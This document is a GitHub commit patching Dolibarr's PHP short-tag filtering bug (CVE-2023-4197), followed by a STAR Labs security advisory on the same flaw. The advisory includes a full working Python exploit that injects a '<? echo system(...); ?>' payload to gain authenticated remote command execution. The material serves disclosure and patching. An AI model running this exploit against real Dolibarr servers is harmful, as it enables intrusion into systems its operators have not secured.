=== Content from github.com_e99df9e8_20250111_181820.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FDolibarr%2Fdolibarr%2Fcommit%2F0ed6a63fb06be88be5a4f8bcdee83185eee4087e)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FDolibarr%2Fdolibarr%2Fcommit%2F0ed6a63fb06be88be5a4f8bcdee83185eee4087e)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=Dolibarr%2Fdolibarr)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Dolibarr](/Dolibarr)
/
**[dolibarr](/Dolibarr/dolibarr)**
Public

* [Notifications](/login?return_to=%2FDolibarr%2Fdolibarr) You must be signed in to change notification settings
* [Fork
  2.8k](/login?return_to=%2FDolibarr%2Fdolibarr)
* [Star
   5.6k](/login?return_to=%2FDolibarr%2Fdolibarr)

* [Code](/Dolibarr/dolibarr)
* [Issues
  936](/Dolibarr/dolibarr/issues)
* [Pull requests
  233](/Dolibarr/dolibarr/pulls)
* [Actions](/Dolibarr/dolibarr/actions)
* [Projects
  2](/Dolibarr/dolibarr/projects)
* [Security](/Dolibarr/dolibarr/security)
* [Insights](/Dolibarr/dolibarr/pulse)

Additional navigation options

* [Code](/Dolibarr/dolibarr)
* [Issues](/Dolibarr/dolibarr/issues)
* [Pull requests](/Dolibarr/dolibarr/pulls)
* [Actions](/Dolibarr/dolibarr/actions)
* [Projects](/Dolibarr/dolibarr/projects)
* [Security](/Dolibarr/dolibarr/security)
* [Insights](/Dolibarr/dolibarr/pulse)

## Commit

[Permalink](/Dolibarr/dolibarr/commit/0ed6a63fb06be88be5a4f8bcdee83185eee4087e)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

FIX #[CVE-2023-4197](https://github.com/advisories/GHSA-r9cm-pw9j-3fpx "CVE-2023-4197")

[Browse files](/Dolibarr/dolibarr/tree/0ed6a63fb06be88be5a4f8bcdee83185eee4087e)
Browse the repository at this point in the history

* Loading branch information

[![@eldy](https://avatars.githubusercontent.com/u/883887?s=40&v=4)](/eldy)

[eldy](/Dolibarr/dolibarr/commits?author=eldy "View all commits by eldy")
committed
Sep 4, 2023

1 parent
[119f6b6](/Dolibarr/dolibarr/commit/119f6b6a7ff696d49376b5e418e99a436130b307)

commit 0ed6a63

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**26 additions**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* htdocs/core/lib

  + htdocs/core/lib/website.lib.php
    [website.lib.php](#diff-a9906b7b52d4f676ddc145e9c4aca6750967a1c2fce6d93f8c64a9c88cfffd19)
* test/phpunit

  + test/phpunit/WebsiteTest.php
    [WebsiteTest.php](#diff-acdfa3d2c36b9b4f98d124a151a735245a6f7d401f70d091016c3bbea077f5cb)

## There are no files selected for viewing

3 changes: 3 additions & 0 deletions

3
[htdocs/core/lib/website.lib.php](#diff-a9906b7b52d4f676ddc145e9c4aca6750967a1c2fce6d93f8c64a9c88cfffd19 "htdocs/core/lib/website.lib.php")

Show comments

[View file](/Dolibarr/dolibarr/blob/0ed6a63fb06be88be5a4f8bcdee83185eee4087e/htdocs/core/lib/website.lib.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -76,6 +76,9 @@ function dolStripPhpCode($str, $replacewith = '') |
|  |  | function dolKeepOnlyPhpCode($str) |
|  |  | { |
|  |  | $str = str\_replace('<?=', '<?php', $str); |
|  |  | $str = str\_replace('<?php', '\_\_LTINTPHP\_\_', $str); |
|  |  | $str = str\_replace('<?', '<?php', $str); // replace the short\_open\_tag. It is recommended to set this is Off in php.ini |
|  |  | $str = str\_replace('\_\_LTINTPHP\_\_', '<?php', $str); |
|  |  |  |
|  |  | $newstr = ''; |
|  |  |  |
| Expand Down | |  |

23 changes: 23 additions & 0 deletions

23
[test/phpunit/WebsiteTest.php](#diff-acdfa3d2c36b9b4f98d124a151a735245a6f7d401f70d091016c3bbea077f5cb "test/phpunit/WebsiteTest.php")

Show comments

[View file](/Dolibarr/dolibarr/blob/0ed6a63fb06be88be5a4f8bcdee83185eee4087e/test/phpunit/WebsiteTest.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -226,4 +226,27 @@ public function testCheckPHPCode() |
|  |  | print \_\_METHOD\_\_." result checkPHPCode=".$result."\n"; |
|  |  | $this->assertEquals($result, 1, 'checkPHPCode did not detect the string was dangerous'); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* testDolKeepOnlyPhpCode |
|  |  | \* |
|  |  | \* @return void |
|  |  | \*/ |
|  |  | public function testDolKeepOnlyPhpCode() |
|  |  | { |
|  |  | $s = 'HTML content <?php exec("eee"); ?> and more HTML content'; |
|  |  | $result = dolKeepOnlyPhpCode($s); |
|  |  | print \_\_METHOD\_\_." result dolKeepOnlyPhpCode=".$result."\n"; |
|  |  | $this->assertEquals('<?php exec("eee"); ?>', $result, 'dolKeepOnlyPhpCode did extract the correct string'); |
|  |  |  |
|  |  | $s = 'HTML content <? exec("eee"); ?> and more HTML content'; |
|  |  | $result = dolKeepOnlyPhpCode($s); |
|  |  | print \_\_METHOD\_\_." result dolKeepOnlyPhpCode=".$result."\n"; |
|  |  | $this->assertEquals('<?php exec("eee"); ?>', $result, 'dolKeepOnlyPhpCode did extract the correct string'); |
|  |  |  |
|  |  | $s = 'HTML content <?php test() <?php test2(); ?> and more HTML content'; |
|  |  | $result = dolKeepOnlyPhpCode($s); |
|  |  | print \_\_METHOD\_\_." result dolKeepOnlyPhpCode=".$result."\n"; |
|  |  | $this->assertEquals('<?php test() ?><?php test2(); ?>', $result, 'dolKeepOnlyPhpCode did extract the correct string'); |
|  |  | } |
|  |  | } |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `0ed6a63`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FDolibarr%2Fdolibarr%2Fcommit%2F0ed6a63fb06be88be5a4f8bcdee83185eee4087e) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from starlabs.sg_afdc5927_20250111_181820.html ===

[![logo](https://starlabs.sg/logo-white.png)](https://starlabs.sg/ "  (Alt + H)")

* [Home](https://starlabs.sg/ "Home")
* [About](https://starlabs.sg/about/ "About")
* [Advisories](https://starlabs.sg/advisories/ "Advisories")
* [Blog](https://starlabs.sg/blog/ "Blog")
* [Achievements](https://starlabs.sg/achievements/ "Achievements")
* [Publications](https://starlabs.sg/publications/ "Publications")
* [Search](https://starlabs.sg/search/ "Search (Alt + /)")

[Home](https://starlabs.sg/) » [Advisories](https://starlabs.sg/advisories/)
# (CVE-2023-4197) Dolibarr ERP CRM (<= 18.0.1) Improper Input Sanitization Authenticated RCE

October 11, 2023 · 6 min · Poh Jia Hao (@Chocologicall)

Table of Contents

* [Summary:](#summary)
* [CVSS3.1 Scoring System:](#cvss31-scoring-system)
* [Product Overview:](#product-overview)
* [Vulnerability Summary:](#vulnerability-summary)
* [Vulnerability Details:](#vulnerability-details)
* [Exploit Conditions:](#exploit-conditions)
* [Proof-of-Concept:](#proof-of-concept)
* [Suggested Mitigations:](#suggested-mitigations)
* [Detection Guidance:](#detection-guidance)
* [Credits:](#credits)
* [Timeline:](#timeline)

## Summary:[#](#summary)

| **Product** | Dolibarr ERP CRM |
| --- | --- |
| **Vendor** | Dolibarr |
| **Severity** | High |
| **Affected Versions** | <= 18.0.1 |
| **Tested Versions** | 17.0.1, 18.0.1 |
| **CVE Identifier** | CVE-2023-4197 |
| **CVE Description** | Improper input validation in Dolibarr ERP CRM <= v18.0.1 fails to strip certain PHP code from user-supplied input when creating a Website, allowing an attacker to inject and evaluate arbitrary PHP code. |
| **CWE Classification(s)** | CWE-20: Improper Input Validation |
| **CAPEC Classification(s)** | CAPEC-248 Command Injection  CAPEC-153: Input Data Manipulation |

## CVSS3.1 Scoring System:[#](#cvss31-scoring-system)

**Base Score:** 7.5 (High)

**Vector String:** `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H`

| **Metric** | **Value** |
| --- | --- |
| **Attack Vector (AV)** | Network |
| **Attack Complexity (AC)** | High |
| **Privileges Required (PR)** | Low |
| **User Interaction (UI)** | None |
| **Scope (S)** | Unchanged |
| **Confidentiality (C)** | High |
| **Integrity (I)** | High |
| **Availability (A)** | High |

## Product Overview:[#](#product-overview)

Dolibarr ERP CRM is a web-based software that provides management for the target organization’s activities, such as contacts, suppliers, invoices, orders, stocks, agenda, etc. It is an open-source software suite designed for small, medium or large companies, foundations and freelancers. Administrators can use the fine grained permissions manager to grant permissions to various users based on their operational requirements.

Dolibarr ERP CRM operates as an all-in-one suite, which allows customizability based on the usage needs of the organization. It is highly modular as the administrators simply have to enable modules that they need and disable the ones they do not require. Almost every component is a module, which also means that Dolibarr ERP CRM is highly extensible in terms of features.

## Vulnerability Summary:[#](#vulnerability-summary)

Users can be granted privileges to add and modify pages in the websites module. Even though there are security settings to only allow HTML/JavaScript/CSS, this can be subverted. Existing checks being to detect PHP content from user-supplied input are insufficient as it only checks for `<?php` and `<?=`, allowing usage of the `<?` short tag for executing PHP code. As a result, an adversary is able to inject unsanitized PHP content into these web pages and achieve code execution via PHP.

## Vulnerability Details:[#](#vulnerability-details)

There are two ways to exploit this vulnerability, one is to “import” content from a specified URL; the other is to edit an existing page.

The vulnerable code can be found in the function `dolKeepOnlyPhpCode()`, inside the `/core/lib/website.lib.php` file. where no checking for the `<?` tag is done. This function intended purpose is to extract the PHP code from the given string and return it to the caller. The caller would throw an error if this function returns a non-empty string since it indicates the presence of PHP code.

```
/core/lib/website.lib.php:
<?php
function dolKeepOnlyPhpCode($str)
{
    $str = str_replace('<?=', '<?php', $str);
    $newstr = '';
    // Split on each opening tag
    //$parts = explode('<?php', $str);
    $parts = preg_split('/'.preg_quote('<?php', '/').'/i', $str);
    if (!empty($parts)) {
        $i = 0;
        foreach ($parts as $part) {
            if ($i == 0) {  // The first part is never php code
                $i++;
                continue;
            }
            $newstr .= '<?php';
            //split on closing tag
            $partlings = explode('?>', $part, 2);
            if (!empty($partlings)) {
                $newstr .= $partlings[0].'?>';
            } else {
                $newstr .= $part.'?>';
            }
        }
    }
    return $newstr;
}

```

This function takes in a single argument which is the string to sanitize. It first replaces all occurrences of `<?=` with `<?php` and subsequently all `<?php` tags are tokenized, and the string between the opening and optional closing tags are selected and returned to the caller.

In order to achieve RCE, the adversary must first be authenticated with an account and the Website module must be enabled. Then, modify an existing web page to include the `<?` tag where arbitrary PHP code can be executed. Command execution is achieved by using any of the PHP functions that executes system code (i.e. `system()`). After the web page is modified successfully, previewing the updated page would trigger the RCE:

![](/advisories/23/images/CVE-2023-4197_01.RCE.png)

## Exploit Conditions:[#](#exploit-conditions)

This vulnerability can be exploited when the “Website” module is enabled, as well as having access to a low-privilege user account.

## Proof-of-Concept:[#](#proof-of-concept)

We have tried our best to make the PoC as portable as possible. The following is a functional exploit written in Python3 that exploits this vulnerability to achieve remote command execution:

```
# Dolibarr ERP CRM (v18.0.1) Improper Input Sanitization Vulnerability (CVE-2023-4197)
# Via: https://TARGET_HOST/website/index.php
# Author: Poh Jia Hao (STAR Labs SG Pte. Ltd.)
#!/usr/bin/env python3
import os
import re
import requests
import sys
import uuid
requests.packages.urllib3.disable_warnings()
s = requests.Session()
def check_args():
    global target, username, password, cmd
    print("\n===== Dolibarr ERP CRM (v18.0.1) Improper Input Sanitization Vulnerability (CVE-2023-4197) =====\n")
    if len(sys.argv) != 5:
        print("[!] Please enter the required arguments like so: python3 {} https://TARGET_URL USERNAME PASSWORD CMD_TO_EXECUTE".format(sys.argv[0]))
        sys.exit(1)
    target = sys.argv[1].strip("/")
    username = sys.argv[2]
    password = sys.argv[3]
    cmd = sys.argv[4]
def authenticate():
    global s, csrf_token
    print("[+] Attempting to authenticate...")
    # GET the CSRF token
    res = s.get(f"{target}/", verify=False)
    csrf_token = re.search("\"anti-csrf-newtoken\" content=\"(.+)\"", res.text).group(1).strip()
    # Login
    data = {
        "token": csrf_token,
        "username": username,
        "password": password,
        "actionlogin": "login"
    }
    res = s.post(f"{target}/", data=data, verify=False)
    if "Logout" not in res.text:
        print("[!] Authentication failed! Are the credentials valid?")
        sys.exit(1)
    else:
        print("[+] Authenticated successfully!")
def rce():
    # Create web site
    print("[+] Attempting to create a website...")
    website_name = uuid.uuid4().hex
    data = {
        "WEBSITE_REF": website_name,
        "token": csrf_token,
        "action": "addsite",
        "WEBSITE_LANG": "en",
        "addcontainer": "create"
    }
    res = s.post(f"{target}/website/index.php", data=data, verify=False)
    if f"Website - {website_name}" not in res.text:
        print("[!] Website creation failed!")
        sys.exit(1)
    else:
        print(f"[+] Created website name: \"{website_name}\"!")
    # Create web page
    print("[+] Attempting to create a web page...")
    webpage_name = uuid.uuid4().hex
    data = {
        "website": website_name,
        "token": csrf_token,
        "action": "addcontainer",
        "WEBSITE_TYPE_CONTAINER": "page",
        "WEBSITE_TITLE": "x",
        "WEBSITE_PAGENAME": webpage_name
    }
    res = s.post(f"{target}/website/index.php", data=data, verify=False)
    if f"Contenair \\'{webpage_name}\\' added" not in res.text:
        print("[!] Web page creation failed!")
        sys.exit(1)
    else:
        print(f"[+] Created web page name: \"{webpage_name}\"!")
    # Modify created page
    print("[+] Attempting to modify the web page...")
    webpage_id = re.search(f"<option value=\"(.+)\" .+{webpage_name}", res.text).group(1).strip()
    data = {
        "website": website_name,
        "WEBSITE_PAGENAME": webpage_name,
        "pageid": webpage_id,
        "token": csrf_token,
        "action": "updatemeta",
        "htmlheader": f"<? echo system('{cmd}'); ?>"
    }
    res = s.post(f"{target}/website/index.php", data=data, verify=False)
    if "Saved" not in res.text:
        print("[!] Web page modification failed!")
        sys.exit(1)
    else:
        print("[+] Web page modified successfully!")
    # Trigger RCE
    print(f"[+] Triggering RCE now via: {target}/public/website/index.php?website={website_name}&pageref={webpage_name}")
    res = s.get(f"{target}/public/website/index.php?website={website_name}&pageref={webpage_name}", verify=False)
    if res.status_code != 200:
        print("[!] Web page is not reachable!")
        sys.exit(1)
    else:
        output = re.findall("block -->\n(.+)</head>", res.text, re.MULTILINE | re.DOTALL)[0].strip()
        print(f"[+] RCE successful! Output of command:\n\n{output}")
def main():
    check_args()
    authenticate()
    rce()
if __name__ == "__main__":
    main()

```

![](/advisories/23/images/CVE-2023-4197_02.Exploit.gif)

## Suggested Mitigations:[#](#suggested-mitigations)

Update the Dolibarr installation to the latest version as shown from the official repository [releases page](https://github.com/Dolibarr/dolibarr/releases).

## Detection Guidance:[#](#detection-guidance)

It is possible to detect the exploitation of this vulnerability by checking the `/document/` directory (default upload directory) to see if there are any `.tpl` files containing `<?` tags, and further inspecting the code contained within.

## Credits:[#](#credits)

Poh Jia Hao ([@Chocologicall](https://twitter.com/Chocologicall)) of STAR Labs SG Pte. Ltd. ([@starlabs\_sg](https://twitter.com/starlabs_sg))

## Timeline:[#](#timeline)

* 2023-09-04 Reported vulnerability to Dolibarr owner
* 2023-09-05 Dolibarr owner acknowledged vulnerability and pushed a patch [commit](https://github.com/Dolibarr/dolibarr/commit/0ed6a63fb06be88be5a4f8bcdee83185eee4087e). Also mentioned that it will be in the next release
* 2023-10-11 New version containing patch released
* 2023-11-01 Public Release

[« Prev

(CVE-2023-1720) Bitrix24 Stored Cross-Site Scripting (XSS) via File Upload](https://starlabs.sg/advisories/23/23-1720/)
[Next »

(CVE-2023-4198) Dolibarr ERP CRM (<= 17.0.3) Improper Access Control](https://starlabs.sg/advisories/23/23-4198/)

© 2024 [STAR Labs](https://starlabs.sg/)
Powered by
[Hugo](https://gohugo.io/) &
[PaperMod](https://git.io/hugopapermod)


